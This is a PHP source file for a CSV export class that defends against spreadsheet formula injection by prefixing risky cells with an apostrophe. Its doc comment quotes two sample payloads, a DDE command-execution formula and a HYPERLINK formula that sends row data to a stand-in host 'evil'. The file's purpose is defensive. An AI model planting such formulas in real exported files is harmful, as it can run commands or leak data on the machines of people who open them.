<?php

namespace App\Support;

use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * The ONE CSV writer. There was none before P1c, which makes this the one chance to get
 * formula-injection neutralisation right rather than retrofit it.
 *
 * THE THREAT. A cell beginning `=`, `+`, `-`, `@`, TAB or CR is executed as a formula by Excel,
 * LibreOffice and Google Sheets when the file is opened. `=cmd|'/c calc'!A1` and
 * `=HYPERLINK("http://evil/?"&A1)` are the classic shapes; the second exfiltrates the row it
 * sits in with one click on a "this file contains links" prompt. A hospital spreadsheet imported
 * into this system and exported again is exactly the round trip that carries an attacker-authored
 * cell from one operator's machine to another's (P1 plan, P1c item 14).
 *
 * THE NEUTRALISATION is a single leading apostrophe — the only one that survives all three
 * applications. `App\Support\Roster\CsvRosterReader` strips exactly one leading apostrophe from
 * any cell that would otherwise begin with a dangerous character, so export -> re-import is
 * lossless. Ship the two together or a round trip renames every affected cell, once per trip.
 * CsvInjectionTest asserts the pairing rather than describing it.
 *
 * THE BOM is not decoration. Without it Excel decodes UTF-8 as the system codepage and Arabic
 * names open as mojibake, which reads as data corruption rather than an encoding default.
 */
final class Csv
{
    private const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    public static function neutralise(?string $value): string
    {
        $value = (string) $value;

        if ($value === '') {
            return '';
        }

        return in_array($value[0], self::DANGEROUS_PREFIXES, true) ? "'".$value : $value;
    }

    /**
     * @param  list<string>  $headers
     * @param  iterable<array<int, string|int|float|null>>  $rows
     */
    public static function stream(string $filename, array $headers, iterable $rows): StreamedResponse
    {
        return response()->streamDownload(function () use ($headers, $rows): void {
            $out = fopen('php://output', 'w');

            fwrite($out, "\xEF\xBB\xBF");
            fputcsv($out, array_map(self::neutralise(...), $headers));

            foreach ($rows as $row) {
                fputcsv($out, array_map(fn ($cell): string => self::neutralise(
                    $cell === null ? '' : (string) $cell
                ), $row));
            }

            fclose($out);
        }, $filename, ['Content-Type' => 'text/csv; charset=UTF-8']);
    }
}
